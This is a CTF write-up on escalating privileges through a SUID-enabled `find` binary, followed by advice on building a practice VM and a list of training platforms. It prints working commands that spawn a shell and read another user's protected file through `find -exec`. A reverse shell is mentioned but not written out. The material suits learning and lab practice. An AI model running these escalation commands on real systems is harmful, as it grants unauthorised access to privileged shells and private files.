### **CTF Challenge Summary: Privilege Escalation with SUID `find`**

**Challenge Description:**
- **Author**: @ep
- **Objective**: Gain access to a `flag.txt` file located in the `finder` user's home directory.
- **Context**: The challenge hints at the need for privilege escalation to access the `flag.txt` file, emphasizing the importance of rewarding the "finders" in the environment.

### **Tactic for Obtaining the Flag:**
- **SUID Binary Found**: The `find` command has the SUID bit set, meaning it can be executed with elevated privileges.
- **Privilege Escalation Technique**: Use the `find` binary to execute commands with the same privileges as its owning user. The following approaches can be used:
  - **Spawn a Shell**:
    ```bash
    find . -exec /bin/sh \; -quit
    ```
    This executes a shell with the privileges of the SUID owner (potentially `finder` or `root`).
  - **Read `flag.txt` Directly**:
    ```bash
    find /home/finder -name flag.txt -exec cat {} \; -quit
    ```
    This command searches for `flag.txt` in the `finder` user's home directory and outputs its content.
  - **Reverse Shell Option** (Advanced):
    - If a reverse shell setup is desired, `find` can be used to execute a bash command that connects back to a listener.

### **Pathways for Safe Exploration on a Host Machine:**

1. **Set Up a Virtual Environment**:
   - Use **VirtualBox** or **VMware** to install a Linux distribution like **Kali Linux** or **Ubuntu** in a virtual machine (VM).
   - Create multiple users (e.g., `user1`, `user2`) to simulate different privilege levels.

2. **Practice Setting SUID Binaries**:
   - Set the SUID bit on `find` or other binaries for testing:
     ```bash
     sudo chmod u+s /usr/bin/find
     ```
   - Create a file (`flag.txt`) with restricted permissions to simulate the challenge:
     ```bash
     echo "This is a test flag" | sudo tee /home/user2/flag.txt
     sudo chown user2:user2 /home/user2/flag.txt
     sudo chmod 600 /home/user2/flag.txt
     ```

3. **Test Escalation Tactics**:
   - Attempt privilege escalation with the SUID `find` to read files or spawn shells.
   - Experiment with other common SUID binaries (`nmap`, `vim`, `less`) to understand their potential as escalation vectors.

4. **CTF Platforms for Skill-Building**:
   - **OverTheWire (Bandit)**: Good for basic Linux and privilege escalation skills.
   - **TryHackMe**: Rooms like "Linux PrivEsc" focus on similar challenges.
   - **Hack The Box (HTB)**: Provides a range of machines that simulate real-world privilege escalation scenarios.

### **Conclusion:**
This challenge serves as a practical introduction to privilege escalation using misconfigured SUID binaries, a common scenario in CTF competitions and penetration testing. Practicing these techniques in a controlled environment helps build a deeper understanding of Linux security concepts.
